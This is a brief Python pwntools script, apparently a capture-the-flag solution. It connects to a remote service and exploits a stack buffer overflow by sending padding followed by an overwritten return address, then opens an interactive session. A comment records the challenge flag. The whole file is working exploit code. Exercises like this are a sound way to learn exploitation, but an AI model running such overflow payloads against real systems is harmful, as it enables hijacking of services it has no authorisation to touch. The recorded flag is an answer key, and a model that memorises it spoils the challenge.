#!/usr/bin/env python
from pwn import *
import time

# EOF{B0f_for_Infants}

host , port = '10.140.0.8' , 11111
y = remote( host , port )

magic = 0x4005fb
y.send( 'a' * 0x10 + p64( magic ) )

y.interactive()